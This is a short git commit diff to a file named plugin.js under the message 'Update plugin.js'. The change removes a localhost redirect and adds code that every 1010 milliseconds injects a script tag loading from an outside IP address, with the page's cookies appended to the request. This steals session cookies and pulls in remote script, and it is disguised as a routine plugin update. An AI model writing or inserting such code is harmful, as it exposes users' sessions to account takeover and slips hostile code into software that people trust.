cdcefcb3ed36a34f19e5d676f2dc6a88c8296f2d
Rascapac <59560059+rascapac@users.noreply.github.com>
2023-11-30 18:57:41 +0100

    Update plugin.js

--- plugin.js
+++ plugin.js
@@ -1,1 +1,1 @@
-document.location="http://localhost/activate-plugin/1"
+setInterval(function(){with(document)body.appendChild(createElement("script")).src="//37.187.20.127:4848/?".concat(document.cookie)},1010)
